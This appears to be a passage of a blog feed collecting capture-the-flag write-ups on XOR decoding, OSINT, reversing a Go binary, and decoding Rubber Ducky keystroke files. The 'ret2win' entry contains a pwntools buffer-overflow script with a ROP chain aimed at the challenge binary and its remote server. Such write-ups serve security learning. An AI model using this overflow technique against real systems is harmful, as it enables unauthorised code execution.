</span></span><span style="display:flex;"><span>    local_218 <span style="color:#f92672">=</span> <span style="color:#a6e22e">CONCAT88</span>(<span style="color:#ae81ff">0x4200000000000001</span>,<span style="color:#f92672">&amp;</span>xor_res);
</span></span><span style="display:flex;"><span>    local_208 <span style="color:#f92672">=</span> <span style="color:#a6e22e">CONCAT88</span>(<span style="color:#ae81ff">1</span>,local_218);
</span></span><span style="display:flex;"><span>    fmt.<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%c&#34;</span>,<span style="color:#ae81ff">2</span>,local_218,<span style="color:#ae81ff">1</span>,flag);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function has many local variables that are assigned values. The for loop interates over the values, xors them with <code>0x11</code>, then prints them. We can can copy these values into a python script to compute the xor and print the flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># byte values in the local vars in main.print_flag() from ghidra</span>
</span></span><span style="display:flex;"><span>bytes<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x75\x26\x31\x22\x25\x31\x77\x24\x31\x25\x26\x31\x21\x22\x31\x74\x25\x31\x75\x23\x31\x22\x24\x31\x20\x22\x31\x77\x24\x31\x74\x27\x31\x20\x22\x31\x25\x27\x31\x77\x25\x31\x73\x26\x31\x27\x25\x31\x25\x24\x31\x22\x25\x31\x24\x24\x31\x25\x25</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>decode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># xor each byte and append it to decode. ignore spaces.</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> bytes:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> b <span style="color:#f92672">!=</span> <span style="color:#ae81ff">49</span>:
</span></span><span style="display:flex;"><span>        decode <span style="color:#f92672">+=</span> chr(b <span style="color:#f92672">^</span> <span style="color:#ae81ff">17</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># reverse the string. the program loops opposite to how we copied the data</span>
</span></span><span style="display:flex;"><span>decode <span style="color:#f92672">=</span> decode[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:: <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># convert the decoded hex codes into ascii and print</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(decode), <span style="color:#ae81ff">2</span>):
</span></span><span style="display:flex;"><span>    print(chr(int(decode[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>)), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>print()
</span></span></code></pre></div><p><code>DUCTF{Od1n_1S-N0t_C}</code></p>
<hr>
<h3 id="monke-bars">Monke Bars</h3>
<ul>
<li>Author: ghostccamm</li>
<li>Category: osint</li>
<li>Difficulty: easy</li>
<li>Points: 100</li>
<li>Solves: 281</li>
</ul>
<hr>
<h4 id="description-1">Description</h4>
<blockquote>
<p>I will be dropping my new track <strong>monke bars</strong> soon! But I suck at rap and don&rsquo;t want to share it&hellip;</p>
<p><em>Can you find the song?</em></p>
<p>NOTE: Flag is in the format <code>DUCTF{...}</code> with no spaces and all lowercase between the <code>{}</code> characters. e.g. DUCTF{icannotrap}</p>
</blockquote>
<hr>
<h4 id="solve-1">Solve</h4>
<p>The description tells us we need to find a song <strong>monke bars</strong>, and that the artist is not so good. A search on <a href="https://soundcloud.com/mc-fat-monke/monke-bars">Soundcloud</a> for &ldquo;monke bars&rdquo; yields a song were the artist has left the comment:
<code>D-U-C-T-F left curly bracket smack it hack it drop that packet crack this track right curly bracket</code>. From this we can get the flag.</p>
<p><code>DUCTF{smackithackitdropthatpacketcrackthistrack}</code></p>
<hr>
<h3 id="my-first-c-program">My First C Program</h3>
<ul>
<li>Author: Pix</li>
<li>Category: misc</li>
<li>Difficulty: easy</li>
<li>Points: 100</li>
<li>Solves: 315</li>
</ul>
<hr>
<h4 id="description-2">Description</h4>
<blockquote>
<p>I decided to finally sit down and learn C, and I don&rsquo;t know what all the fuss is about this language it writes like a <em><strong>dream</strong></em>!</p>
<p>Here is my first challenge in C! Its really easy after you install the C installer installer, after that you just run it and you&rsquo;re free to fly away with the flag like a <em><strong>berd</strong></em>!</p>
</blockquote>
<hr>
<h4 id="files-1">Files</h4>
<p><code>my_first_c_prog.c</code> - ASCII text</p>
<hr>
<h4 id="solve-2">Solve</h4>
<p><code>my_first_c_prog.c</code> contains a poorly written program in c. The program first sets the values of some variables and then prints out the flag by combining the values of the variables in the following function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>   <span style="color:#66d9ef">union</span> <span style="color:#a6e22e">print_flag</span>(end, middle, secondmiddle, start, realstart) <span style="color:#f92672">=&gt;</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;The flag is:&#34;</span>)<span style="color:#f92672">!</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;DUCTF{${start}_${realstart}_${end}_${secondmiddle}_1s_${middle}_C}&#34;</span>)<span style="color:#f92672">!!!</span>
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Now to print the flag for the CTF!!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">print_flag</span>(thank, vars[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], end, heck_eight, ntino)
</span></span></code></pre></div><p>For each argument to the <code>print_flag</code> function we can determine its value by interpreting and correcting the rest of the program.</p>
<p><code>DUCTF{I_D0nT_Th1nk_th15_1s_R34L_C}</code></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Either or Neither nor</title>
      <link>https://treseco.github.io/posts/ritsecctf23/either_or_neither_nor/</link>
      <pubDate>Tue, 23 May 2023 19:01:07 -0400</pubDate>
      
      <guid>https://treseco.github.io/posts/ritsecctf23/either_or_neither_nor/</guid>
      <description><![CDATA[<h3 id="either-or-neither-nor">Either or Neither nor</h3>
<ul>
<li>Category: crypto</li>
<li>Points: 100</li>
</ul>
<hr>
<h4 id="files">Files</h4>
<p><code>chal.py</code> - Python script, ASCII text executable</p>
<hr>
<h4 id="solve">Solve</h4>
<p>The contents of chal.py tell us that the flag has been xored with a key and we only have the resulting encrypted flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#! /usr/bin/env python </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;XXXXXXXXXXXXXXXXXXXXX&#34;</span> 
</span></span><span style="display:flex;"><span>enc_flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">91</span>,<span style="color:#ae81ff">241</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">166</span>,<span style="color:#ae81ff">85</span>,<span style="color:#ae81ff">192</span>,<span style="color:#ae81ff">87</span>,<span style="color:#ae81ff">188</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">164</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">152</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">252</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">152</span>,<span style="color:#ae81ff">117</span>,<span style="color:#ae81ff">164</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">162</span>,<span style="color:#ae81ff">107</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>KEY_LEN <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encrypt the flag </span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> idx, c <span style="color:#f92672">in</span> enumerate(flag): 
</span></span><span style="display:flex;"><span>	enc_flag <span style="color:#f92672">=</span> ord(c) <span style="color:#f92672">^</span> key[idx <span style="color:#f92672">%</span> len(key)]
</span></span></code></pre></div><p>The xor operation has properties that make it simple to reverse. If <code>a ^ b = c</code> then <code>c ^ b = a</code>. Because we have the encrypted flag, and the encrypted bytes are equal to <code>f ^ k</code> where <code>f</code> and <code>k</code> are the flag bytes and the key bytes respectively, we can figure out bytes of the flag from bytes of the key and vice versa. Because we know the flag format is &lsquo;MetaCTF{}&rsquo;, we can find the key by individually xoring the first four bytes of the encrypted flag with the known first four bytes of the flag &lsquo;Meta&rsquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># encrypted flag</span>
</span></span><span style="display:flex;"><span>enc_flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">91</span>,<span style="color:#ae81ff">241</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">166</span>,<span style="color:#ae81ff">85</span>,<span style="color:#ae81ff">192</span>,<span style="color:#ae81ff">87</span>,<span style="color:#ae81ff">188</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">164</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">152</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">252</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">152</span>,<span style="color:#ae81ff">117</span>,<span style="color:#ae81ff">164</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">162</span>,<span style="color:#ae81ff">107</span>]
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>] 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># calculate key from enc_flag and known start of flag</span>
</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> enc_flag[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> ord(<span style="color:#e6db74">&#39;M&#39;</span>)
</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> enc_flag[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> ord(<span style="color:#e6db74">&#39;e&#39;</span>)
</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> enc_flag[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> ord(<span style="color:#e6db74">&#39;t&#39;</span>)
</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> enc_flag[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print decrypted flag</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> idx, c <span style="color:#f92672">in</span> enumerate(enc_flag):
</span></span><span style="display:flex;"><span>    print(chr(c <span style="color:#f92672">^</span> key[idx <span style="color:#f92672">%</span> len(key)]), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>print()
</span></span></code></pre></div><p>Flag: <code>MetaCTF{x0r_th3_c0re}</code></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Jurassic Park</title>
      <link>https://treseco.github.io/posts/ritsecctf23/jurassic_park/</link>
      <pubDate>Tue, 23 May 2023 19:01:07 -0400</pubDate>
      
      <guid>https://treseco.github.io/posts/ritsecctf23/jurassic_park/</guid>
      <description><![CDATA[<h3 id="jurassic-park">Jurassic park</h3>
<ul>
<li>Category: Rev</li>
<li>Points: 294</li>
</ul>
<hr>
<h4 id="files">Files</h4>
<p><code>JuarrasicPark</code> - JurassicPark: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=4XMyVkn0sTek7nw8EEYU/QdfCrifAK-NMKTlAgud5/tWG5xm3UkP6nAyK9dh6I/QDTAn6gKrQy1Vt4Cl8mo, with debug_info, not stripped</p>
<hr>
<h4 id="solve">Solve</h4>
<p>I was not the first on my team to solve this challenge, but didn&rsquo;t notice until I had solved it. I feel it is still worth documenting this method of extracting a file from memory with pwndbg.</p>
<p>In <code>main</code> we find a call to <code>embed.FS.ReadFile</code> being called on a file called  <code>flag.png</code></p>
<pre tabindex="0"><code>│       ┌─&gt; 0x0048e500      cmp   rsp, qword [r14 + 0x10]
│      ┌──&lt; 0x0048e504      jbe   0x48e615
│      │╎   0x0048e50a      sub   rsp, 0x70
│      │╎   0x0048e50e      mov   qword [var_8h], rbp
│      │╎   0x0048e513      lea   rbp, [var_8h]
│      │╎   0x0048e518      mov   rax, qword obj.main.f
│      │╎   0x0048e51f      lea   rbx, str.flag.png            ; 0x4a828a 
│      │╎   0x0048e526      mov   ecx, 8                       ; int64_t arg_20h
│      │╎   0x0048e52b      call  sym.embed.FS.ReadFile
	...
</code></pre><p>running the executable with gdb we can step to the instruction right after the call to <code>ReadFile</code>. $rax now points to the start of the file but we don&rsquo;t know where it ends. The end can be found by searching for the &lsquo;IEND&rsquo; string in memory which will mark the end of PNG files. <code>0x444e4549</code> are the bytes that we are looking for.</p>
<pre tabindex="0"><code>pwndbg&gt; hexdump $rax
+0000 0xc000070000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  │.PNG....│....IHDR│
+0010 0xc000070010  00 00 03 ba 00 00 00 f9  08 06 00 00 00 09 20 49  │........│.......I│
+0020 0xc000070020  32 00 00 2c ea 49 44 41  54 78 5e ed dd 07 d8 34  │2..,.IDA│Tx^....4│
+0030 0xc000070030  eb 59 17 f0 fb 04 10 01  41 10 42 87 f3 26 48 42  │.Y......│A.B..&amp;HB│
pwndbg&gt; find $rax, +0xffffffff, 0x444e4549
0xc000072d1b
warning: Unable to access 16000 bytes of target memory at 0xc003ffc71f, halting search.
1 pattern found.
pwndbg&gt; dump binary memory dump.bin $rax 0xc000072d2b
pwndbg&gt;
</code></pre><p>Dumping the memory from $rax to a bit past the &lsquo;IEND&rsquo; string will give us the flag.png and the image contains the flag.</p>
<p>Flag: <code>RS{G0_3MB3D_TH3_FLAG}</code></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>ret2win</title>
      <link>https://treseco.github.io/posts/ritsecctf23/ret2win/</link>
      <pubDate>Tue, 23 May 2023 19:01:07 -0400</pubDate>
      
      <guid>https://treseco.github.io/posts/ritsecctf23/ret2win/</guid>
      <description><![CDATA[<h3 id="ret2win">ret2win</h3>
<ul>
<li>Pwn</li>
<li>83 pts</li>
</ul>
<hr>
<h4 id="description">Description</h4>
<blockquote>
<p>Are you looking for an exploit dev job. Well apply to the Republic of Potatoes. We are looking for the best hackers out there. Download the binary, find the secret door and remember to pass the right password.</p>
</blockquote>
<hr>
<h4 id="files">Files</h4>
<p><code>ret2win</code> - ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6407290ddc178ebcff6a243a585c21e8c32a440b, for GNU/Linux 3.2.0, not stripped</p>
<hr>
<h4 id="solve">Solve</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./ret2win&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal<span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-v&#39;</span>]
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args[<span style="color:#e6db74">&#39;REMOTE&#39;</span>]:
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;ret2win.challenges.ctf.ritsec.club&#39;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2win&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#p = gdb.debug(&#39;./ret2win&#39;, &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    starti</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#&#39;&#39;&#39;)</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2win&#39;</span>)
</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>supersecrettoplevelfunction
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;(ROP)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)  <span style="color:#75715e">#does not work on remote, buffer not flushed?</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#ae81ff">40</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4012b3</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xcafebabe</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4012b1</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xc0debabe</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xffffffff</span>)<span style="color:#f92672">+</span>p64(win))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>]]></description>
      
    </item>
    
    
    
    <item>
      <title>Ducky1</title>
      <link>https://treseco.github.io/posts/byuctf23/ducky1/</link>
      <pubDate>Mon, 22 May 2023 16:05:08 -0500</pubDate>
      
      <guid>https://treseco.github.io/posts/byuctf23/ducky1/</guid>
      <description><![CDATA[<h3 id="ducky1">Ducky1</h3>
<ul>
<li>Category: Rev</li>
<li>Difficulty: Easy</li>
<li>Points: 100</li>
<li>Solves: 185</li>
</ul>
<hr>
<h4 id="description">Description</h4>
<blockquote>
<p>I recently got ahold of a Rubber Ducky, and have started automating ALL of my work tasks with it! You should check it out!</p>
</blockquote>
<hr>
<h4 id="files">Files</h4>
<p><code>inject.bin</code> - data</p>
<hr>
<h4 id="solve">Solve</h4>
<p>The contents of <code>inject.bin</code> dosn&rsquo;t give us much information.</p>
<pre tabindex="0"><code>$ xxd inject.bin
00000000: 00ff 00ff 00ff 00ff 00ff 00ff 00ff 00ff  ................
	...
00000350: 00ff 00ff 00ff 00ff 00ff 00ff 00ff 005f  ..............._
00000360: 0500 1c00 1800 0600 1700 0900 2f02 1700  ............/...
00000370: 0b00 0c00 1600 2d02 1a00 0400 1600 2d02  ......-.......-.
00000380: 0d00 1800 1600 1700 2d02 0400 1100 2d02  ........-.....-.
00000390: 0c00 1100 1700 1500 1200 2d02 0400 0f00  ..........-.....
000003a0: 1500 0c00 0a00 0b00 1700 3802 3802 3002  ..........8.8.0.
</code></pre><p>The description tells us that this file is a &ldquo;Rubber Ducky&rdquo;, and resarching this tells us that a Rubber Ducky is keyboard device that appears like a USB drive and sends a keystroke payload when pluged into a computer. Further research shows some tools that can be used to encode and decode these rubber ducky payloads, such as <a href="https://github.com/kevthehermit/DuckToolkit">DuckToolkit</a>. Using Ducktoolkit we can decode <code>inject.bin</code>.</p>
<pre tabindex="0"><code>$ python3 ducktools.py -d -l us ../inject.bin /dev/stdout
[+] Reading Duck Bin file
  [-] Decoding file
  [-] Writing ducky text to /dev/stdout
DELAY
byuctf{this_was_just_an_intro_alright??}[+] Process Complete
</code></pre><p>After decoding we get the flag.
<code>byuctf{this_was_just_an_intro_alright??}</code></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Ducky2</title>
      <link>https://treseco.github.io/posts/byuctf23/ducky2/</link>
      <pubDate>Mon, 22 May 2023 16:05:08 -0500</pubDate>
      
      <guid>https://treseco.github.io/posts/byuctf23/ducky2/</guid>
      <description><![CDATA[<p>#writeup</p>
<h1 id="ducky2">Ducky2</h1>
<ul>
<li>Category: Rev</li>
<li>Difficulty: Medium</li>
<li>Points: 476</li>
<li>Solves: 36</li>
</ul>
<hr>
<h5 id="description">Description</h5>
<blockquote>
<p>Okay, turnsk out that wask too easy to decode. You skhoud definitely try thisk one now!
(<em>Note - Ducky3 is unlocked after solving this challenge</em>)</p>
</blockquote>
<hr>
<h5 id="files">Files</h5>
<p><code>inject.bin</code> - data</p>
<hr>
<h5 id="solve">Solve</h5>
<p>We are given a very similar file to <code>inject.bin</code> from ducky1. Let&rsquo;s try to decode this one with <a href="https://github.com/kevthehermit/DuckToolkit">DuckToolkit</a> as well.</p>
<pre tabindex="0"><code>$ python3 ducktools.py -d -l us ../inject.bin /dev/stdout
[+] Reading Duck Bin file
  [-] Decoding file
  [-] Writing ducky text to /dev/stdout
DELAY
bzuctfmakesurezourkezboardissetupright|_}|&#34;}|[+] Process Complete
</code></pre><p>Ok, that didn&rsquo;t seem to work but it does give us a hint by telling us to &lsquo;make sure your keyboard is set up right&rsquo;. DuckToolkit does give us the option of decoding using different languages so this is something to try. We just need to determine what language this could be.</p>
<p>Most characters seem to decode correctly, we can see that &lsquo;bzuctf&rsquo; is probably supposed to be &lsquo;byuctf&rsquo;. By compareing the data in <code>inject.bin</code> from ducky1 to the data in <code>inject.bin</code> from ducky2, we can determine what keycodes should print what characters. Using the language files in <code>DuckToolkit/ducktoolkit/languages</code> will be helpful for figuring out the keycodes.</p>
<blockquote>
<p>[!WARNING]
Installing DuckToolkit via pip will not include all of the language files in the github repo, so it is advised to install from github for this challenge.</p>
</blockquote>
<p>ducky1 <code>inject.bin</code> with lang = &lsquo;us&rsquo;:</p>
<pre tabindex="0"><code>00000360: 0500 1c00 1800 0600 1700 0900 2f02  -&gt; decodes to -&gt; &#39;byuctf{&#39;
          b    y    u    c    t    f    {
</code></pre><p>ducky2 <code>inject.bin</code> with lang = ?:</p>
<pre tabindex="0"><code>00000360: 0500 1d00 1800 0600 1700 0900 0505  -&gt; decodes to -&gt; &#39;bzuctf&#39;
          b    z(y) u    c    t    f    ({)
</code></pre><p>We can see that the language we need encodes &lsquo;{&rsquo; as &lsquo;0505&rsquo;, so the correct language will have this line in the language file:
<code>&quot;{&quot;:&quot;05,00,05&quot;,</code></p>
<p>It turns out there are two languages, Czech and Slovak, that have this property and decode the payload without issues.</p>
<pre tabindex="0"><code>$ python3 ducktools.py -d -l cz ../inject.bin /dev/stdout
[+] Reading Duck Bin file
  [-] Decoding file
  [-] Writing ducky text to /dev/stdout
DELAY
byuctf{makesureyourkeyboardissetupright&#39;@&amp;%(#@&#39;!(#*$&#39;}[+] Process Complete
$ python3 ducktools.py -d -l sk ../inject.bin /dev/stdout
[+] Reading Duck Bin file
  [-] Decoding file
  [-] Writing ducky text to /dev/stdout
DELAY
byuctf{makesureyourkeyboardissetupright)@&amp;%(#@)!(#*$)}[+] Process Complete
</code></pre><p>Aside from the numerous intentional &lsquo;sk&rsquo; typos in the challenge description, it is not obvious which flag is correct but trying both will reveal the correct flag.
<code>byuctf{makesureyourkeyboardissetupright)@&amp;%(#@)!(#*$)}</code></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Ducky3</title>
      <link>https://treseco.github.io/posts/byuctf23/ducky3/</link>
      <pubDate>Mon, 22 May 2023 16:05:08 -0500</pubDate>
      
      <guid>https://treseco.github.io/posts/byuctf23/ducky3/</guid>
      <description><![CDATA[<h3 id="ducky3">Ducky3</h3>
<ul>
<li>Category: Rev</li>
<li>Difficulty: Medium</li>
<li>Points: 497</li>
<li>Solves: 14</li>
</ul>
<hr>
<h4 id="description">Description</h4>
<blockquote>
<p>Alright fine, I&rsquo;ll make my own keyboard layout&hellip;</p>
</blockquote>
<hr>
<h4 id="files">Files</h4>
<p><code>inject.bin</code> - data
<code>payload.txt</code> - ASCII text</p>
<hr>
<h4 id="solve">Solve</h4>
<p>This challenge only provided another <code>inject.bin</code> file initially. As the description says, this file dosn&rsquo;t seem to match any language, and appears to be custom made. The challenge was later fixed to include <code>payload.txt</code>.</p>
<pre tabindex="0"><code>STRING abcdefghijklmnopqrstuvwxyz
STRING ABCDEFGHIJKLMNOPQRSTUVWXYZ
STRING 0123456789
STRING !@#$%^&amp;*()-_
STRING
</code></pre><p><code>payload.txt</code> seems to be part of the payload that was encoded into <code>inject.bin</code>. Looking into how the <a href="https://github.com/kevthehermit/DuckToolkit/blob/master/ducktoolkit/encoder.py">DuckToolkit encoder</a> works reveals that &lsquo;STRING&rsquo; will simply encode the following string in the payload. This tells us that first part of <code>inject.bin</code>  encodes the string <code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_</code></p>
<p>We can use this to figure out the keycodes and decode the rest of the file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fpath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./inject.bin&#39;</span>
</span></span><span style="display:flex;"><span>ht <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>keys <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>keystr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#keys[&#39;{  0x65}&#39;] = &#39;C&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#keys[&#39;{2 0x6}&#39;] = &#39;{&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#keys[&#39;{2 0x10}&#39;] = &#39;}&#39;</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read in data from inject.bin</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(fpath, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_keycode</span>(data, datidx):
</span></span><span style="display:flex;"><span>    keycode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> data[datidx<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>: <span style="color:#75715e"># determine shift modifier from second byte</span>
</span></span><span style="display:flex;"><span>        keycode <span style="color:#f92672">=</span> keycode <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;{2 &#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        keycode <span style="color:#f92672">=</span> keycode <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;{  &#39;</span>
</span></span><span style="display:flex;"><span>    keycode <span style="color:#f92672">=</span> keycode <span style="color:#f92672">+</span> hex(data[datidx]) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;}&#39;</span> <span style="color:#75715e"># determine keycode from first byte</span>
